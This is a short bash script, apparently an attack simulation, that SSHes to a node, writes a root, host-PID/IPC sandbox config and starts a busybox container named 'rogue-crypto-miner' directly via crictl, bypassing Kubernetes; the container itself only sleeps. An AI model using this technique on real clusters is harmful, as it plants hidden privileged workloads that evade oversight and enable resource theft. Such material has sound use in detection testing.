#!/usr/bin/env bash
set -euo pipefail
ssh node01 'sudo bash -c "\
cat > /tmp/rogue-sandbox.json <<EOF
{
  \"metadata\": { \"name\": \"rogue-sandbox\", \"namespace\": \"default\", \"attempt\": 0, \"uid\": \"rogue-uid-001\" },
  \"log_directory\": \"/tmp/rogue-logs\",
  \"linux\": {
    \"cgroup_parent\": \"kubepods.slice\",
    \"security_context\": { \"namespace_options\": { \"network\": 2, \"pid\": 1, \"ipc\": 1 }, \"run_as_user\": { \"value\": 0 } }
  }
}
EOF
SB=\$(crictl runp /tmp/rogue-sandbox.json 2>/dev/null)
if [ -n \"\$SB\" ]; then
  cat > /tmp/rogue-container.json <<EOF
{
  \"metadata\": { \"name\": \"rogue-crypto-miner\" },
  \"image\": { \"image\": \"docker.io/library/busybox:1.36\" },
  \"command\": [\"sh\", \"-c\", \"while true; do sleep 3600; done\"],
  \"stdin\": true,
  \"linux\": {}
}
EOF
CT=\$(crictl create \"\$SB\" /tmp/rogue-container.json /tmp/rogue-sandbox.json 2>/dev/null)
if [ -n \"\$CT\" ]; then
  crictl start \"\$CT\" >/dev/null 2>&1
  echo \"[pid] Rogue container spawned via crictl\"
fi
fi
\"'